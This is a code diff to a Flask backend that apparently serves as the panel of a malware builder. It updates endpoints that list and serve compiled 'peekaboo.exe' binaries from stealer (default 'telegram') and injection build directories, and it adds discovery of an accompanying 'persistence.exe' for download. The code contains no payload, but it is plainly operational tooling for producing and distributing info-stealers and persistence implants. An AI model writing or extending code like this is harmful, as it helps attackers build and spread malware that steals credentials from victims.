@@ -304,9 +304,7 @@ def api_logs():
         limit = min(int(request.args.get("limit", 10)), 200)
         builds = _db.get_builds(limit)
         for b in builds:
-            p = _resolve_build_binary(b)
-            b["binary_available"] = p is not None
-            b["binary_name"]      = p.name if p else None
+            b["binary_files"] = _resolve_build_files(b)
         return jsonify(builds)
     except Exception:
         return jsonify([])
@@ -341,7 +339,6 @@ def api_builds_binaries_clear():
 def _resolve_build_binary(build: dict) -> Path | None:
     """Return the Path to a build's primary binary, or None if not found."""
     params = build.get("params", {})
-    # Preferred: explicitly stored relative (or absolute) path
     stored = params.get("out_path", "")
     if stored:
         p = Path(stored) if Path(stored).is_absolute() else BASE_DIR / stored
@@ -351,11 +348,24 @@ def _resolve_build_binary(build: dict) -> Path | None:
     malware_type = params.get("malware", "")
     if malware_type == "stealer":
         p = MALWARE_DIR / "stealer" / params.get("stealer", "telegram") / "peekaboo.exe"
-    elif malware_type in ("injection", "") and "injection" in params:
+    elif "injection" in params:
         p = MALWARE_DIR / "injection" / params["injection"] / "peekaboo.exe"
     else:
         return None
     return p if p.exists() else None
+
+
+def _resolve_build_files(build: dict) -> list[dict]:
+    """Return all available compiled files for a build (main binary + persistence if present)."""
+    p = _resolve_build_binary(build)
+    if not p:
+        return []
+    files = [{"name": p.name, "size": p.stat().st_size, "type": "main"}]
+    # persistence is always compiled into the same directory as the main binary
+    pers = p.parent / "persistence.exe"
+    if pers.exists():
+        files.append({"name": "persistence.exe", "size": pers.stat().st_size, "type": "persistence"})
+    return files
 
 
 @app.route("/api/build/<build_id>/binary-info")
@@ -369,10 +379,7 @@ def api_build_binary_info(build_id: str):
         return jsonify({"error": "not found"}), 404
     if job.get("status") != "success":
         return jsonify({"files": []})
-    p = _resolve_build_binary(job)
-    if not p:
-        return jsonify({"files": []})
-    return jsonify({"files": [{"name": p.name, "size": p.stat().st_size}]})
+    return jsonify({"files": _resolve_build_files(job)})
 
 
 @app.route("/api/build/<build_id>/binary/<filename>")
